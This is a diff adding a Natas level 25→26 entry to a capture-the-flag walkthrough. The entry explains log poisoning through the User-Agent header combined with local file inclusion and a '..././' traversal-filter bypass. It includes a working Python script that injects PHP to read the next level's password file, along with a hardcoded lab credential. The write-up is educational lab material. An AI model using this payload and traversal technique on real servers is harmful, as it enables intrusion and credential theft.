@@ -764,3 +764,28 @@ The source shows that PHP will compare the entered password string with the actu
 3. Pass the 'passwd' parameter in the URL as an array (passwd[]) and equate it to any string.
 
 4. PHP will give a warning but the password for the next level will be revealed.
+
+### Natas Level 25 → Level 26
+**Key Takeaways**  
+The source shows that the 'lang' parameter is vulnerable here, since it generates the content. It can be seen that we need to inject PHP into the User-Agent header so it is written to the site’s log files, then use the app’s file-include/LFI behavior to include the log file from `/var/www/natas/natas25/logs/` and execute that PHP to read `/etc/natas_webpass/natas26`.
+
+**Procedure**
+
+1. Log in using the username `natas25` and the password from Level 24.
+
+2. Sample script (Credit: Dr4ks): https://github.com/Dr4ks/Natas_Labs_Solution
+
+```
+import requests
+
+target = 'http://natas25.natas.labs.overthewire.org/?revelio=1'
+auth = ('natas25', 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws')
+
+session=requests.Session()
+malhead={"User-Agent":'<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'}
+
+response = session.get(target, auth=auth)
+response=session.post(url=target,headers=malhead,auth=auth,data={"lang" : "..././..././..././..././..././var/www/natas/natas25/logs/natas25_" +  session.cookies['PHPSESSID'] + ".log"})
+print(response.text)
+```
+The password for the next level will be revealed in the content.
